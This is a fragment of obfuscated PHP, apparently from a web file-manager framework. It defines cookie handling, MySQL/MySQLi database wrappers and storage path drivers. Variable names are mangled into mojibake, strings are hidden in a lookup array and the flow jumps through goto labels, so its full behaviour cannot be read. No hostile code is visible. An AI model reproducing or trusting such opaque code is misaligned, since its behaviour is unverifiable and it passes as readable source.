intval($ì‘¨Œ)); } public function download($Ôò™Ø£Û, $›æ•Çï³) { return $this->iconvSystem($Ôò™Ø£Û); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ŒçÃÜÏ¦) { parent::__construct($ŒçÃÜÏ¦); $this->signatureVersion($_SERVER[¥Ÿ©ÒèÌ][211]); } public function fileOutLink($¸œ™®­Â) { $ÒªÚ­ĞÔ =& $_SERVER[¥Ÿ©ÒèÌ]; if (substr($¸œ™®­Â, 0, 7) == $ÒªÚ­ĞÔ[1309]) { $¸œ™®­Â = $ÒªÚ­ĞÔ[1310] . substr($¸œ™®­Â, 7); } header($ÒªÚ­ĞÔ[158] . $¸œ™®­Â); die; } } goto FÎò‚êèø; cº²ÈÙ‰„“: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($’º»½Æ² = '', $ˆ©ÖÒå› = 0) { if (is_string($’º»½Æ²) && $’º»½Æ² != $_SERVER[¥Ÿ©ÒèÌ][12]) { $this->prefix = $’º»½Æ²; } if (is_numeric($ˆ©ÖÒå›) && $ˆ©ÖÒå› > 0) { $this->expire = $ˆ©ÖÒå›; } } public static function getInstance() { static $çÉï¿; if ($çÉï¿ === null) { $çÉï¿ = new self(); } return $çÉï¿; } private static $cookieDisable = false; public static function disable($×ûÁ±ùõ) { self::$cookieDisable = $×ûÁ±ùõ; } private static $sameCookieSet = array(); public static function set($æ±‚Ñ, $™â­àÆŒ, $²©±³©³ = 0, $Ğ‚ñ¨Îâ = false, $ü§ºÅ€Ò = false) { $’€ö‘›° =& $_SERVER[¥Ÿ©ÒèÌ]; if (self::$cookieDisable) { return; } if (!$²©±³©³) { $²©±³©³ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$æ±‚Ñ]) && self::$sameCookieSet[$æ±‚Ñ] == $™â­àÆŒ . $²©±³©³) { return; } self::$sameCookieSet[$æ±‚Ñ] = $™â­àÆŒ . $²©±³©³; if (!$ü§ºÅ€Ò) { $ü§ºÅ€Ò = str_replace(HOST, $’€ö‘›°[12], APP_HOST); $ü§ºÅ€Ò = _get($GLOBALS, $’€ö‘›°[868], $ü§ºÅ€Ò); } $ûÔ´¥¹ì = $’€ö‘›°[12]; setcookie($æ±‚Ñ, $™â­àÆŒ, time() + $²©±³©³, $’€ö‘›°[8] . trim($ü§ºÅ€Ò, $’€ö‘›°[8]) . $ûÔ´¥¹ì, !1, !1, $Ğ‚ñ¨Îâ); } public static function setSafe($¼¨à°‰, $³Ó¾áë™, $¢²İÁÔ© = 0) { self::set($¼¨à°‰, $³Ó¾áë™, $¢²İÁÔ©, !0); } public static function get($Ì““ˆóî) { static $ÑŞ»öÚ = false; if (!$ÑŞ»öÚ) { self::initHeaderCookie(); $ÑŞ»öÚ = !0; } return isset($_COOKIE[$Ì““ˆóî]) ? $_COOKIE[$Ì““ˆóî] : !1; } private static function initHeaderCookie() { $§¿¾áÛù =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($_SERVER[$§¿¾áÛù[869]]) || !$_SERVER[$§¿¾áÛù[869]]) { return; } $÷Í”¶Š = explode($§¿¾áÛù[71], $_SERVER[$§¿¾áÛù[869]]); foreach ($÷Í”¶Š as $Æ×Ìã€Û) { $Æ×Ìã€Û = explode($§¿¾áÛù[870], $Æ×Ìã€Û); if (count($Æ×Ìã€Û) != 2 || !isset($Æ×Ìã€Û[1])) { continue; } $_COOKIE[trim($Æ×Ìã€Û[0])] = trim($Æ×Ìã€Û[1]); } } public static function remove($’¥Î˜†¡, $š“Æûş = false) { unset($_COOKIE[$’¥Î˜†¡]); self::set($’¥Î˜†¡, $_SERVER[¥Ÿ©ÒèÌ][12], 1, $š“Æûş); } } class DbMysql extends Db { public function __construct($©ÓÖ¤å† = '') { $¢ÁÏâÒå =& $_SERVER[¥Ÿ©ÒèÌ]; if (!extension_loaded($¢ÁÏâÒå[794])) { think_exception(think_lang($¢ÁÏâÒå[14]) . $¢ÁÏâÒå[871]); } if (!empty($©ÓÖ¤å†)) { $this->config = $©ÓÖ¤å†; if (empty($this->config[$¢ÁÏâÒå[17]])) { $this->config[$¢ÁÏâÒå[17]] = $¢ÁÏâÒå[12]; } } } public function connect($áÊ¡ÜŸõ = '', $ÃüÁ€Äˆ = 0, $üí¯¤û× = false) { $°åÏÓ¯ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($this->linkID[$ÃüÁ€Äˆ])) { if (empty($áÊ¡ÜŸõ)) { $áÊ¡ÜŸõ = $this->config; } $©à´£Ù³ = $áÊ¡ÜŸõ[$°åÏÓ¯[872]] . ($áÊ¡ÜŸõ[$°åÏÓ¯[873]] ? "\72{$áÊ¡ÜŸõ[$°åÏÓ¯[873]]}" : $°åÏÓ¯[12]); $ê°¸‡ïá = !empty($áÊ¡ÜŸõ[$°åÏÓ¯[17]][$°åÏÓ¯[18]]) ? $áÊ¡ÜŸõ[$°åÏÓ¯[17]][$°åÏÓ¯[18]] : $this->pconnect; if ($ê°¸‡ïá) { $this->linkID[$ÃüÁ€Äˆ] = mysql_pconnect($©à´£Ù³, $áÊ¡ÜŸõ[$°åÏÓ¯[874]], $áÊ¡ÜŸõ[$°åÏÓ¯[875]], 131072); } else { $this->linkID[$ÃüÁ€Äˆ] = mysql_connect($©à´£Ù³, $áÊ¡ÜŸõ[$°åÏÓ¯[874]], $áÊ¡ÜŸõ[$°åÏÓ¯[875]], !0, 131072); } if (!$this->linkID[$ÃüÁ€Äˆ] || !empty($áÊ¡ÜŸõ[$°åÏÓ¯[21]]) && !mysql_select_db($áÊ¡ÜŸõ[$°åÏÓ¯[21]], $this->linkID[$ÃüÁ€Äˆ])) { think_exception(mysql_error()); } $ü‹°û³º = mysql_get_server_info($this->linkID[$ÃüÁ€Äˆ]); mysql_query($°åÏÓ¯[876] . think_config($°åÏÓ¯[877]) . $°åÏÓ¯[58], $this->linkID[$ÃüÁ€Äˆ]); if ($ü‹°û³º > $°åÏÓ¯[878]) { mysql_query($°åÏÓ¯[879], $this->linkID[$ÃüÁ€Äˆ]); } $this->connected = !0; if (1 != think_config($°åÏÓ¯[22])) { unset($this->config); } } return $this->linkID[$ÃüÁ€Äˆ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($­”çÇğ) { $Šäöùùü =& $_SERVER[¥Ÿ©ÒèÌ]; if (0 === stripos($­”çÇğ, $Šäöùùü[268])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $­”çÇğ; if ($this->queryID) { $this->free(); } think_action_status($Šäöùùü[23], 1); think_status($Šäöùùü[24]); $this->queryID = mysql_query($­”çÇğ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Ó¥Ñü²) { $Õ¢®Ñ³± =& $_SERVER[¥Ÿ©ÒèÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ó¥Ñü²; if ($this->queryID) { $this->free(); } think_action_status($Õ¢®Ñ³±[25], 1); think_status($Õ¢®Ñ³±[24]); $„ÊŒÆÙ’ = mysql_query($Ó¥Ñü², $this->_linkID); $this->debug(); if (!1 === $„ÊŒÆÙ’) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¥Ÿ©ÒèÌ][880], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ï°³Î¢™ = mysql_query($_SERVER[¥Ÿ©ÒèÌ][881], $this->_linkID); $this->transTimes = 0; if (!$Ï°³Î¢™) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $„ÆÛŸ˜æ = mysql_query($_SERVER[¥Ÿ©ÒèÌ][882], $this->_linkID); $this->transTimes = 0; if (!$„ÆÛŸ˜æ) { $this->error(); return !1; } } return !0; } private function getAll() { $ÆóñÓ´í = array(); if ($this->numRows > 0) { while ($€¿´€Ø† = mysql_fetch_assoc($this->queryID)) { $ÆóñÓ´í[] = $€¿´€Ø†; } mysql_data_seek($this->queryID, 0); } return $ÆóñÓ´í; } public function getFields($ÊÏ¸Á‡º) { $áĞ´¸¿ =& $_SERVER[¥Ÿ©ÒèÌ]; $†ú¢¢Ïø = $this->query($áĞ´¸¿[883] . $this->parseKey($ÊÏ¸Á‡º)); $ùäæ•»‘ = array(); if ($†ú¢¢Ïø) { foreach ($†ú¢¢Ïø as $ä»àÚÁ— => $¸õëÌ¸ö) { $ùäæ•»‘[$¸õëÌ¸ö[$áĞ´¸¿[31]]] = array($áĞ´¸¿[32] => $¸õëÌ¸ö[$áĞ´¸¿[31]], $áĞ´¸¿[33] => $¸õëÌ¸ö[$áĞ´¸¿[34]], $áĞ´¸¿[35] => (bool) (strtoupper($¸õëÌ¸ö[$áĞ´¸¿[36]]) === $áĞ´¸¿[884]), $áĞ´¸¿[37] => $¸õëÌ¸ö[$áĞ´¸¿[38]], $áĞ´¸¿[39] => strtolower($¸õëÌ¸ö[$áĞ´¸¿[40]]) == $áĞ´¸¿[41], $áĞ´¸¿[42] => strtolower($¸õëÌ¸ö[$áĞ´¸¿[43]]) == $áĞ´¸¿[44]); } } return $ùäæ•»‘; } public function getTables($ìÚ¢«Óæ = '') { $æ»¦ô›Ù =& $_SERVER[¥Ÿ©ÒèÌ]; if (!empty($ìÚ¢«Óæ)) { $¶±§È¹¦ = $æ»¦ô›Ù[885] . $ìÚ¢«Óæ . $æ»¦ô›Ù[886]; } else { $¶±§È¹¦ = $æ»¦ô›Ù[887]; } $·§¢Í×‚ = $this->query($¶±§È¹¦); $†ñÔ‹ù’ = array(); foreach ($·§¢Í×‚ as $°•ÍĞùÕ => $ƒ‰Û†ŠÎ) { $†ñÔ‹ù’[$°•ÍĞùÕ] = current($ƒ‰Û†ŠÎ); } return $†ñÔ‹ù’; } public function replace($‡É÷£ü, $ûå®â“  = array()) { $•é¾ß˜¶ =& $_SERVER[¥Ÿ©ÒèÌ]; foreach ($‡É÷£ü as $—×µ¸‰ø => $ŒÒ»ò­¡) { $Ÿ‡Ş³¶ø = $this->parseValue($ŒÒ»ò­¡); if (is_scalar($Ÿ‡Ş³¶ø)) { $ÑÇö«Ú[] = $Ÿ‡Ş³¶ø; $Øüôñş¶[] = $this->parseKey($—×µ¸‰ø); } } $ÍÑù°ûò = $•é¾ß˜¶[888] . $this->parseTable($ûå®â“ [$•é¾ß˜¶[283]]) . $•é¾ß˜¶[889] . implode($•é¾ß˜¶[50], $Øüôñş¶) . $•é¾ß˜¶[890] . implode($•é¾ß˜¶[50], $ÑÇö«Ú) . $•é¾ß˜¶[891]; return $this->execute($ÍÑù°ûò); } public function insertAll($„çä±Ê, $æ–®Šşê = array(), $ìÆ´½¡ = false) { $¬çÁ£œ¹ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!is_array($„çä±Ê[0])) { return !1; } $Ù„Œ¸´¿ = array_keys($„çä±Ê[0]); $Œ¡—‹Õ— = array(); foreach ($„çä±Ê as $­´òª Ä) { $øºÌı·· = array(); foreach ($­´òª Ä as $ĞÁ¹ÅÌ => $Üì¸ö¤) { $Üì¸ö¤ = $this->parseValue($Üì¸ö¤); if (is_scalar($Üì¸ö¤)) { $øºÌı··[] = $Üì¸ö¤; } } $Œ¡—‹Õ—[] = $¬çÁ£œ¹[264] . implode($¬çÁ£œ¹[50], $øºÌı··) . $¬çÁ£œ¹[891]; } array_walk($Ù„Œ¸´¿, array($this, $¬çÁ£œ¹[892])); $š•ò¸âé = ($ìÆ´½¡ ? $¬çÁ£œ¹[893] : $¬çÁ£œ¹[894]) . $¬çÁ£œ¹[895] . $this->parseTable($æ–®Šşê[$¬çÁ£œ¹[283]]) . $¬çÁ£œ¹[889] . implode($¬çÁ£œ¹[50], $Ù„Œ¸´¿) . $¬çÁ£œ¹[896] . implode($¬çÁ£œ¹[50], $Œ¡—‹Õ—); return $this->execute($š•ò¸âé); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÏğßøúÌ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->error = mysql_errno() . $ÏğßøúÌ[4] . mysql_error($this->_linkID); if ($ÏğßøúÌ[12] != $this->queryStr) { $this->error .= LNG($ÏğßøúÌ[48]) . $this->queryStr; } think_trace($this->error, $ÏğßøúÌ[12], $ÏğßøúÌ[49]); return $this->error; } public function escapeString($ş¨¶Ñë) { if ($this->_linkID) { return mysql_real_escape_string($ş¨¶Ñë, $this->_linkID); } else { return mysql_escape_string($ş¨¶Ñë); } } public function parseKey(&$¡è©·õä, $óúÀ­ = true) { $½éàË€ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($óúÀ­) { $¡è©·õä = $this->parseKeyCheck($¡è©·õä); } if ($¡è©·õä != $½éàË€[181] && !preg_match($½éàË€[897], $¡è©·õä)) { $¡è©·õä = $½éàË€[389] . trim($¡è©·õä, $½éàË€[389]) . $½éàË€[389]; } return $¡è©·õä; } } class DbMysqli extends Db { public function __construct($ÛÏÓÏ¥ = '') { $ÛÔøì¦¯ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!extension_loaded($ÛÔøì¦¯[898])) { think_exception(think_lang($ÛÔøì¦¯[14]) . $ÛÔøì¦¯[899]); } if (!empty($ÛÏÓÏ¥)) { $this->config = $ÛÏÓÏ¥; if (empty($this->config[$ÛÔøì¦¯[17]])) { $this->config[$ÛÔøì¦¯[17]] = $ÛÔøì¦¯[12]; } } } public function connect($÷à£Àœ¨ = '', $ñ²§ß¤· = 0) { $‰Œàê¬Ã =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($this->linkID[$ñ²§ß¤·])) { if (empty($÷à£Àœ¨)) { $÷à£Àœ¨ = $this->config; } $this->linkID[$ñ²§ß¤·] = new mysqli($÷à£Àœ¨[$‰Œàê¬Ã[872]], $÷à£Àœ¨[$‰Œàê¬Ã[874]], $÷à£Àœ¨[$‰Œàê¬Ã[875]], $÷à£Àœ¨[$‰Œàê¬Ã[21]], $÷à£Àœ¨[$‰Œàê¬Ã[873]] ? intval($÷à£Àœ¨[$‰Œàê¬Ã[873]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¤Ë÷¸Ü¿ = $this->linkID[$ñ²§ß¤·]->server_version; $this->linkID[$ñ²§ß¤·]->query($‰Œàê¬Ã[876] . think_config($‰Œàê¬Ã[877]) . $‰Œàê¬Ã[58]); if ($¤Ë÷¸Ü¿ > $‰Œàê¬Ã[878]) { $this->linkID[$ñ²§ß¤·]->query($‰Œàê¬Ã[879]); } $this->connected = !0; if (1 != think_config($‰Œàê¬Ã[22])) { unset($this->config); } } return $this->linkID[$ñ²§ß¤·]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ºï–à¦ó) { $ØŒ‰Ú =& $_SERVER[¥Ÿ©ÒèÌ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ºï–à¦ó; if ($this->queryID) { $this->free(); } think_action_status($ØŒ‰Ú[23], 1); think_status($ØŒ‰Ú[24]); $this->queryID = $this->_linkID->query($ºï–à¦ó); if ($this->_linkID->more_results()) { while (($Ó×†é¶º = $this->_linkID->next_result()) != NULL) { $Ó×†é¶º->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($”‚¬ıŸõ) { $‰±ìğç· =& $_SERVER[¥Ÿ©ÒèÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $”‚¬ıŸõ; if ($this->queryID) { $this->free(); } think_action_status($‰±ìğç·[25], 1); think_status($‰±ìğç·[24]); $õ»‹„Ïİ = $this->_linkID->query($”‚¬ıŸõ); $this->debug(); if (!1 === $õ»‹„Ïİ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $©æÙ¸·• = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$©æÙ¸·•) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $›—¤ª˜› = $this->_linkID->rollback(); $this->transTimes = 0; if (!$›—¤ª˜›) { $this->error(); return !1; } } return !0; } private function getAll() { $Ş‘ŸâßÃ = array(); if ($this->numRows > 0) { for ($å„ÅóÌ = 0; $å„ÅóÌ < $this->numRows; $å„ÅóÌ++) { $Ş‘ŸâßÃ[$å„ÅóÌ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Ş‘ŸâßÃ; } public function getFields($èÑ§Æ÷) { $è·ØŠâ =& $_SERVER[¥Ÿ©ÒèÌ]; $•«›ˆ = $this->query($è·ØŠâ[883] . $this->parseKey($èÑ§Æ÷)); $×„š—üœ = array(); if ($•«›ˆ) { foreach ($•«›ˆ as $ó‡ƒ†€ => $¬ºÄÃÕµ) { $×„š—üœ[$¬ºÄÃÕµ[$è·ØŠâ[31]]] = array($è·ØŠâ[32] => $¬ºÄÃÕµ[$è·ØŠâ[31]], $è·ØŠâ[33] => $¬ºÄÃÕµ[$è·ØŠâ[34]], $è·ØŠâ[35] => (bool) ($¬ºÄÃÕµ[$è·ØŠâ[36]] === $è·ØŠâ[12]), $è·ØŠâ[37] => $¬ºÄÃÕµ[$è·ØŠâ[38]], $è·ØŠâ[39] => strtolower($¬ºÄÃÕµ[$è·ØŠâ[40]]) == $è·ØŠâ[41], $è·ØŠâ[42] => strtolower($¬ºÄÃÕµ[$è·ØŠâ[43]]) == $è·ØŠâ[44]); } } return $×„š—üœ; } public function getTables($ÀƒÈóÎê = '') { $‚ˆâ˜‘ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÛæÀÈûå = !empty($ÀƒÈóÎê) ? $‚ˆâ˜‘[885] . $ÀƒÈóÎê . $‚ˆâ˜‘[886] : $‚ˆâ˜‘[887]; $¦¿»¦¢À = $this->query($ÛæÀÈûå); $œšÀ˜Â² = array(); if ($¦¿»¦¢À) { foreach ($¦¿»¦¢À as $©ı•Ø => $£Ù¹¤‹) { $œšÀ˜Â²[$©ı•Ø] = current($£Ù¹¤‹); } } return $œšÀ˜Â²; } public function replace($Ë›è†©ü, $Ó’á‘à = array()) { $¾ÒÈôş =& $_SERVER[¥Ÿ©ÒèÌ]; foreach ($Ë›è†©ü as $ÄóÁ÷ıˆ => $è‰´Ğ¬¥) { $ô€ùƒ = $this->parseValue($è‰´Ğ¬¥); if (is_scalar($ô€ùƒ)) { $—ˆáİ«è[] = $ô€ùƒ; $†¥ÁŞÚÏ[] = $this->parseKey($ÄóÁ÷ıˆ); } } $ÛŒ×ÊÙË = $¾ÒÈôş[888] . $this->parseTable($Ó’á‘à[$¾ÒÈôş[283]]) . $¾ÒÈôş[889] . implode($¾ÒÈôş[50], $†¥ÁŞÚÏ) . $¾ÒÈôş[890] . implode($¾ÒÈôş[50], $—ˆáİ«è) . $¾ÒÈôş[891]; return $this->execute($ÛŒ×ÊÙË); } public function insertAll($¡Ü­›Æ», $Šü§Áñ = array(), $¶æŸŞÊ = false) { $Ïéªğ© =& $_SERVER[¥Ÿ©ÒèÌ]; if (!is_array($¡Ü­›Æ»[0])) { return !1; } $á†Øø = array_keys($¡Ü­›Æ»[0]); $¤Ï½†ú = array(); foreach ($¡Ü­›Æ» as $ºÒù‹£ú) { $ë£ãÖ¡Å = array(); foreach ($ºÒù‹£ú as $«ì‚÷¡ => $—¡˜ªÚ¥) { $—¡˜ªÚ¥ = $this->parseValue($—¡˜ªÚ¥); if (is_scalar($—¡˜ªÚ¥)) { $ë£ãÖ¡Å[] = $—¡˜ªÚ¥; } } $¤Ï½†ú[] = $Ïéªğ©[264] . implode($Ïéªğ©[50], $ë£ãÖ¡Å) . $Ïéªğ©[891]; } array_walk($á†Øø, array($this, $Ïéªğ©[892])); $å•–»Œ = $¶æŸŞÊ ? $Ïéªğ©[893] : $Ïéªğ©[894]; $òìº¾ùç = $å•–»Œ . $Ïéªğ©[895] . $this->parseTable($Šü§Áñ[$Ïéªğ©[283]]) . $Ïéªğ©[889] . implode($Ïéªğ©[50], $á†Øø) . $Ïéªğ©[896] . implode($Ïéªğ©[50], $¤Ï½†ú); return $this->execute($òìº¾ùç); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ŞÖÆë‹ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->error = $this->_linkID->errno . $ŞÖÆë‹[4] . $this->_linkID->error; if ($ŞÖÆë‹[12] != $this->queryStr) { $this->error .= LNG($ŞÖÆë‹[48]) . $this->queryStr; } think_trace($this->error, $ŞÖÆë‹[12], $ŞÖÆë‹[49]); return $this->error; } public function escapeString($ÙÌ¬Õ›) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÙÌ¬Õ›); } else { return addslashes($ÙÌ¬Õ›); } } public function parseKey(&$èŠ•¨šÚ, $Ş¹ùôè = true) { $¯›ÍÛ¥… =& $_SERVER[¥Ÿ©ÒèÌ]; if ($Ş¹ùôè) { $èŠ•¨šÚ = $this->parseKeyCheck($èŠ•¨šÚ); } if ($èŠ•¨šÚ != $¯›ÍÛ¥…[181] && !preg_match($¯›ÍÛ¥…[897], $èŠ•¨šÚ)) { $èŠ•¨šÚ = $¯›ÍÛ¥…[389] . trim($èŠ•¨šÚ, $¯›ÍÛ¥…[389]) . $¯›ÍÛ¥…[389]; } return $èŠ•¨šÚ; } } goto AçíÑëêïÛ; F»‚Åğ‡££: define($_SERVER[¥Ÿ©ÒèÌ][244], 3); define($_SERVER[¥Ÿ©ÒèÌ][245], 1); define($_SERVER[¥Ÿ©ÒèÌ][246], 0); goto cøğÙ­†ä; FŞĞ˜ùÇ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $¿ÍÆö»œ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->objectDriver = array($¿ÍÆö»œ[60], $¿ÍÆö»œ[61], $¿ÍÆö»œ[62], $¿ÍÆö»œ[63], $¿ÍÆö»œ[64], $¿ÍÆö»œ[65], $¿ÍÆö»œ[66], $¿ÍÆö»œ[67], $¿ÍÆö»œ[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($²™‰ü³Ú) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($²™‰ü³Ú, $_SERVER[¥Ÿ©ÒèÌ][8]); } return $²™‰ü³Ú; } public function iconvApp($ãÀ‡ø·ü) { return $ãÀ‡ø·ü; } public function iconvSystem($™¤ªû) { return $™¤ªû; } public function iconvTo($¨›¾Á Ì, $Í‡¢Ğñà, $ÈŞíêÕæ) { $‹ëÚ¹ÌÒ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$¨›¾Á Ì || !function_exists($‹ëÚ¹ÌÒ[69])) { return $¨›¾Á Ì; } static $Ü”Ì¤ß» = array(); $÷šÜ¸Ì¼ = $Í‡¢Ğñà . $‹ëÚ¹ÌÒ[70] . $ÈŞíêÕæ . $‹ëÚ¹ÌÒ[71] . $¨›¾Á Ì; if (isset($Ü”Ì¤ß»[$÷šÜ¸Ì¼])) { return $Ü”Ì¤ß»[$÷šÜ¸Ì¼]; } if (function_exists($‹ëÚ¹ÌÒ[72])) { $£°œö † = @mb_convert_encoding($¨›¾Á Ì, $ÈŞíêÕæ, $Í‡¢Ğñà); } else { $£°œö † = @iconv($Í‡¢Ğñà, $ÈŞíêÕæ, $¨›¾Á Ì); } $£°œö † = $£°œö † ? $£°œö † : $¨›¾Á Ì; if (strstr($£°œö †, $‹ëÚ¹ÌÒ[73])) { $£°œö † = str_replace($‹ëÚ¹ÌÒ[73], $‹ëÚ¹ÌÒ[11], $£°œö †); } $Ü”Ì¤ß»[$Í‡¢Ğñà . $‹ëÚ¹ÌÒ[70] . $ÈŞíêÕæ . $‹ëÚ¹ÌÒ[71] . $¨›¾Á Ì] = $£°œö †; $Ü”Ì¤ß»[$ÈŞíêÕæ . $‹ëÚ¹ÌÒ[70] . $Í‡¢Ğñà . $‹ëÚ¹ÌÒ[71] . $¨›¾Á Ì] = $¨›¾Á Ì; $Ü”Ì¤ß»[$ÈŞíêÕæ . $‹ëÚ¹ÌÒ[70] . $Í‡¢Ğñà . $‹ëÚ¹ÌÒ[71] . $£°œö †] = $¨›¾Á Ì; $Ü”Ì¤ß»[$Í‡¢Ğñà . $‹ëÚ¹ÌÒ[70] . $ÈŞíêÕæ . $‹ëÚ¹ÌÒ[71] . $£°œö †] = $£°œö †; return $£°œö †; } public function getPathInner($ îÛœÊ) { $„¢õŞœô = IO::init($ îÛœÊ); return $„¢õŞœô->path; } public function getPathOuter($ÍÜÆâ’‰) { $ÆâÚíéÚ =& $_SERVER[¥Ÿ©ÒèÌ]; $Àş°œ° = strlen(trim($this->pathBase, $ÆâÚíéÚ[8])); $ÍÜÆâ’‰ = substr(trim($ÍÜÆâ’‰, $ÆâÚíéÚ[8]), $Àş°œ°); return $this->pathDriver . $ÆâÚíéÚ[8] . ltrim($ÍÜÆâ’‰, $ÆâÚíéÚ[8]); } public function isParentOf($§‡×ĞŸâ, $àÏ¿’ƒµ) { $¬ØüŞÖş =& $_SERVER[¥Ÿ©ÒèÌ]; $§‡×ĞŸâ = rtrim(strtolower($§‡×ĞŸâ), $¬ØüŞÖş[8]) . $¬ØüŞÖş[8]; $àÏ¿’ƒµ = rtrim(strtolower($àÏ¿’ƒµ), $¬ØüŞÖş[8]) . $¬ØüŞÖş[8]; $”Ñ–¹¶ = strpos($àÏ¿’ƒµ, $§‡×ĞŸâ) === 0; return $”Ñ–¹¶; } public function getType() { $ÓªƒÕØ =& $_SERVER[¥Ÿ©ÒèÌ]; $›†Õ³ï = str_replace($ÓªƒÕØ[74], $ÓªƒÕØ[12], get_class($this)); return strtolower($›†Õ³ï); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($‡ÏÈì”Î, $í­ŒÃœÆ) { $½øÄ®×Í =& $_SERVER[¥Ÿ©ÒèÌ]; $ş®¥á¸” = rtrim($‡ÏÈì”Î, $½øÄ®×Í[8]) . $½øÄ®×Í[8] . $í­ŒÃœÆ; $éãºµø = $this->exist($ş®¥á¸”); return $éãºµø ? $ş®¥á¸” : !1; } public function setModifyTime($âŞü¡ÄÑ, $ïÒ ¾¾¯ = '') { } public function renameObject($ €ê›œÚ, $•ö ¢õú) { $«øö„ÂÕ =& $_SERVER[¥Ÿ©ÒèÌ]; $å«ü€¶ã = $•ö ¢õú; Hook::trigger($«øö„ÂÕ[75], $this, $ €ê›œÚ, $this, $this->pathFather($ €ê›œÚ) . $•ö ¢õú); $ €ê›œÚ = $this->getPathOuter($ €ê›œÚ); $•ö ¢õú = $this->pathFather($ €ê›œÚ) . $•ö ¢õú; if (IO::isFile($ €ê›œÚ)) { $‰€éÊı = IO::copy($ €ê›œÚ, $this->pathFather($ €ê›œÚ), REPEAT_RENAME_FOLDER, $å«ü€¶ã); if ($‰€éÊı) { IO::remove($ €ê›œÚ); } } else { $‰€éÊı = IO::mkdir($•ö ¢õú); if (!$‰€éÊı) { return !1; } $©õôŸ£± = IO::listPath($ €ê›œÚ, !0); $ƒâ¤ğæ = array_merge($©õôŸ£±[$«øö„ÂÕ[76]], $©õôŸ£±[$«øö„ÂÕ[77]]); foreach ($ƒâ¤ğæ as $ÊÔî´ÆÇ) { IO::move($ÊÔî´ÆÇ[$«øö„ÂÕ[78]], $•ö ¢õú, REPEAT_RENAME_FOLDER); } IO::remove($ €ê›œÚ); } return $‰€éÊı ? $•ö ¢õú : !1; } public function tempFile($İó€¥–ô = '', $˜˜ºĞÛ… = '') { if (!$İó€¥–ô) { $İó€¥–ô = rand_string(15); } $Û£µó¸³ = TEMP_FILES . rand_string(15) . $_SERVER[¥Ÿ©ÒèÌ][8]; @mkdir($Û£µó¸³, DEFAULT_PERRMISSIONS, !0); $ıĞÇĞİ¹ = $Û£µó¸³ . $İó€¥–ô; @touch($ıĞÇĞİ¹); if ($˜˜ºĞÛ…) { file_put_contents($ıĞÇĞİ¹, $˜˜ºĞÛ…); } return $ıĞÇĞİ¹; } public function tempFileRemve($ïéöê­) { @unlink($ïéöê­); @rmdir($this->pathFather($ïéöê­)); } public function mkfile($º¸¾µ²Ü, $Ò¡ÕòÅ = '', $…¦Ó×Ç = REPEAT_RENAME) { } public function mkdir($ÈƒŸÛ‚, $ºŒÈ–ÃÍ = REPEAT_SKIP) { } public function delFile($ô¤ï³Ê) { } public function delFolder($­ùõÌæÂ) { } public function copyFile($İô³‰× , $Ğí¨ò”º) { } public function moveFile($×¯—‰Ç», $ÆÀşñË÷) { } public function remove($ Ç¢ˆÅ•) { if ($this->isFile($ Ç¢ˆÅ•)) { return $this->delFile($ Ç¢ˆÅ•); } return $this->delFolder($ Ç¢ˆÅ•); } public function rename($¥â‚¯»‰, $ÌƒŞÕÒ´) { } public function exist($ÑªÁ‘«„) { } public function findByHash($‚™‘Â¤ = '', $”ˆİ§›ì = '') { return !1; } public function isFile($ë÷°İ‚ú) { } public function isFolder($èè³õ¬‡) { } public function size($ä³Ô´) { } public function info($ÎÑø‚ûˆ) { } public function infoSimple($•Ñ‰“) { return $this->info($•Ñ‰“); } public function infoAuth($÷ÍŞğà) { return 